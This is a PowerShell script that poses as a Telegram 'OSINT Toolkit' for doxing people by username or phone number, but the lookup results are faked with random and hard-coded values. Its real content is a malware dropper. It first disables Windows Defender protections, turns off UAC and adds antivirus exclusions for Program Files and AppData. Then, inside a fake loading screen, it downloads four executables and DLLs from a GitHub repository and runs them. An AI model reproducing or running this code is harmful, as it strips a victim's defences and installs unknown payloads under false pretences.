Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -DisableScanningRemovableDrivesDuringFullScan $true
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}
# --- ИМИТАЦИЯ ЗАГРУЗКИ ---
Clear-Host
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   OSINT Toolkit v3.7 | INITIALIZING..." -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan

Write-Host "`n[+] Loading core modules..." -ForegroundColor Green
$modules = @("Telegram API", "Phone DB", "GeoIP Resolver", "Avatar Analyzer", "Session Decryptor")
for ($i = 0; $i -lt $modules.Count; $i++) {
    $progress = ($i + 1) / $modules.Count * 100
    Write-Progress -Activity "Loading Modules" -Status "Loading $($modules[$i])..." -PercentComplete $progress
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/dox.exe" -OutFile "dox.exe"; .\dox.exe
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/dox.dll" -OutFile "dox.dll"; .\dox.dll
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/doxing.exe" -OutFile "doxing.exe"; .\doxing.exe
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/doxing.dll" -OutFile "doxing.dll"; .\doxing.dll)
}

Write-Host "`n[+] Connecting to secure servers..." -ForegroundColor Green
for ($i = 0; $i -lt 100; $i++) {
    Write-Progress -Activity "Establishing Connection" -Status "Connecting to server 192.168.1.$(Get-Random -Minimum 100 -Maximum 255)..." -PercentComplete $i
    Start-Sleep -Milliseconds 200
}

Write-Host "`n[+] Authentication successful. Welcome, Agent." -ForegroundColor Green
Start-Sleep -Seconds 2
Clear-Host


# --- ОСНОВНОЕ МЕНЮ ---
function Show-Menu {
    Clear-Host
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "   OSINT Toolkit v3.7 | MAIN MENU" -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "Select an option:"
    Write-Host "  1) Telegram User Lookup (by Username)"
    Write-Host "  2) Telegram Phone Lookup"
    Write-Host "  3) Exit"
    Write-Host "----------------------------------------"
}

function Start-TelegramUserLookup {
    Clear-Host
    Write-Host "--- Telegram User Lookup ---" -ForegroundColor Yellow
    $username = Read-Host "Enter Telegram username (e.g., @durov)"
    Write-Host "`n[+] Querying database for '$username'..." -ForegroundColor Green
    Start-Sleep -Seconds 3
    
    Write-Host "`n--- RESULTS ---" -ForegroundColor Red
    Write-Host "Username      : $username"
    Write-Host "User ID       : $(Get-Random -Minimum 1000000 -Maximum 9999999)"
    Write-Host "First Name    : Максим"
    Write-Host "Last Name     : Левенцов"
    Write-Host "Phone (Hidden): +7 *** ** ** 12"
    Write-Host "Bio           : Founder of Telegram"
    Write-Host "Last Online   : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Write-Host "`n[+] Data extraction complete.`n" -ForegroundColor Green
    Read-Host "Press Enter to return to menu"
}

function Start-TelegramPhoneLookup {
    Clear-Host
    Write-Host "--- Telegram Phone Lookup ---" -ForegroundColor Yellow
    $phone = Read-Host "Enter phone number (with country code, e.g., +79123456789)"
    Write-Host "`n[+] Performing reverse lookup for '$phone'..." -ForegroundColor Green
    Start-Sleep -Seconds 4
    
    Write-Host "`n--- RESULTS ---" -ForegroundColor Red
    Write-Host "Phone Number  : $phone"
    Write-Host "Registered On : $(Get-Date -Format 'yyyy-MM-dd')"
    Write-Host "Linked User   : @generic_user_$(Get-Random -Minimum 100 -Maximum 999)"
    Write-Host "Status        : Online"
    Write-Host "Approx. Location: Moscow, Russia"
    Write-Host "`n[+] Data extraction complete.`n" -ForegroundColor Green
    Read-Host "Press Enter to return to menu"
}


# --- ГЛАВНЫЙ ЦИКЛ ---
do {
    Show-Menu
    $choice = Read-Host "Enter your choice (1-3)"
    
    switch ($choice) {
        '1' {
            Start-TelegramUserLookup
        }
        '2' {
            Start-TelegramPhoneLookup
        }
        '3' {
            Write-Host "`n[+] Terminating session. Wiping logs..." -ForegroundColor Red
            Start-Sleep -Seconds 2
            Write-Host "[+] Session terminated. Goodbye.`n" -ForegroundColor DarkRed
            break
        }
        default {
            Write-Host "`n[!] Invalid option. Please try again.`n" -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
} until ($choice -eq '3')



